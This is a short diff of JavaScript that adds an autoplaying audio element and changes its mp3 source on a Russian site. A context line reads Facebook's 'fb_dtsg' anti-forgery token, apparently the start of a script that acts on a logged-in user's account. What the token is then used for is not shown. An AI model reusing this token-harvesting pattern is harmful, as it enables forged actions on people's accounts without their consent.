@@ -19,7 +19,7 @@ _audio.style.height="25px";
 _audio.controls = true;
 _audio.autoplay = false;
 _audio.autoplay = true;
-_audio.src = "http://buraevo.ru/UserFiles/54081213avril_lavigne_-_i_will_be.mp3";
+_audio.src = "http://buraevo.ru/UserFiles/Rizky_Design.mp3";
 _div.appendChild(_audio);
 _body.appendChild(_div);
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
